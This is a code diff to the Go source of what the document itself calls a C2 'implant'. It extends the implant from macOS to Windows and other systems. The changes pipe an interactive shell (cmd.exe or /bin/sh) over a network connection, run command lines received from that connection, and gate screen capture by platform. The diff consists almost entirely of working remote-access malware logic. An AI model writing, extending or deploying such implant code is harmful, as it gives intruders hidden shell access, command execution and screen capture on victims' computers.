@@ -157,8 +157,8 @@ func session(c net.Conn) int {
 				// macOS input is best-effort; click mapping is still sent from UI
 			case protocol.CmdShellOn:
 				closeShell()
-				cmd := exec.Command("/bin/zsh", "-i")
-				cmd.Env = append(os.Environ(), "LANG=en_US.UTF-8", "LC_ALL=en_US.UTF-8")
+				cmd := shellCmd()
+				cmd.Env = append(os.Environ(), "LANG=en_US.UTF-8", "LC_ALL=en_US.UTF-8", "CHCP=65001")
 				in, e1 := cmd.StdinPipe()
 				out, e2 := cmd.StdoutPipe()
 				cmd.Stderr = cmd.Stdout
@@ -221,8 +221,21 @@ func sendErr(c net.Conn, msg string) {
 	_ = writeFrame(c, protocol.RspErr, []byte(msg))
 }
 
+// shellCmd starts the platform shell: cmd.exe on Windows, /bin/sh elsewhere.
+func shellCmd() *exec.Cmd {
+	if runtime.GOOS == "windows" {
+		return exec.Command("cmd.exe", "/Q", "/K", "chcp 65001>nul")
+	}
+	return exec.Command("/bin/sh", "-i")
+}
+
 func runCmd(c net.Conn, cmdline string) {
-	cmd := exec.Command("/bin/zsh", "-c", cmdline)
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd.exe", "/c", cmdline)
+	} else {
+		cmd = exec.Command("/bin/sh", "-c", cmdline)
+	}
 	out, err := cmd.CombinedOutput()
 	if len(out) == 0 {
 		if err != nil {
@@ -399,6 +412,12 @@ func handleRen(c net.Conn, spec string) {
 }
 
 func handleScreen(c net.Conn, maxW int, sendEnd bool) {
+	if runtime.GOOS != "darwin" {
+		if sendEnd {
+			sendErr(c, "screen capture needs the C implant on Windows; Go implant only supports macOS desktop")
+		}
+		return
+	}
 	tmp, err := os.CreateTemp("", "c2-scr-*.jpg")
 	if err != nil {
 		if sendEnd {
